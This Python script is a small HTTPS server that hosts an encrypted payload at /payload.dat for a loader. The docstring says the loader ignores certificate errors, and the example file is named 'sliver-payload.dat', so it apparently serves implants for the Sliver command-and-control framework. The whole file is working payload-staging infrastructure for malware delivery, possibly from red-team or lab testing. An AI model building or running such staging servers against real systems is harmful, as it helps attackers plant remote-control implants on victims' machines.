#!/usr/bin/env python3
"""Tiny HTTPS server that hands out a single encrypted payload at /payload.dat
(or /data.enc — both URLs map to the same file).

Self-signed cert auto-generated in --certdir. Loader's WinINet retries with
SECURITY_FLAG_IGNORE_UNKNOWN_CA on first failure, so cert validity doesn't matter.

Usage:
    python host-payload.py --port 18443 --enc payloads/sliver-payload.dat
"""
import argparse
import os
import ssl
import sys
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


def make_cert(certdir: Path) -> tuple[Path, Path]:
    certdir.mkdir(parents=True, exist_ok=True)
    crt = certdir / "host.crt"
    key = certdir / "host.key"
    if crt.exists() and key.exists():
        return crt, key
    # Use openssl from PATH (Git for Windows ships it). Fall back to mkcert if available.
    subprocess.check_call([
        "openssl", "req", "-x509", "-nodes", "-newkey", "rsa:2048",
        "-keyout", str(key), "-out", str(crt),
        "-days", "365", "-subj", "/CN=zero-loader-test"
    ])
    return crt, key


def make_handler(enc_path: Path):
    class H(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            sys.stderr.write("[srv] " + fmt % args + "\n")

        def do_GET(self):
            if self.path in ("/payload.dat", "/data.enc"):
                if not enc_path.exists():
                    self.send_response(404); self.end_headers(); return
                data = enc_path.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404); self.end_headers()
    return H


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=9443)
    ap.add_argument("--enc", required=True)
    ap.add_argument("--certdir", default="certs")
    args = ap.parse_args()

    enc_path = Path(args.enc).resolve()
    if not enc_path.exists():
        print(f"[!] enc file missing: {enc_path}", file=sys.stderr); return 1

    crt, key = make_cert(Path(args.certdir).resolve())
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(str(crt), str(key))

    srv = HTTPServer(("0.0.0.0", args.port), make_handler(enc_path))
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"[+] Serving {enc_path} on https://0.0.0.0:{args.port}/payload.dat", flush=True)
    srv.serve_forever()


if __name__ == "__main__":
    sys.exit(main())
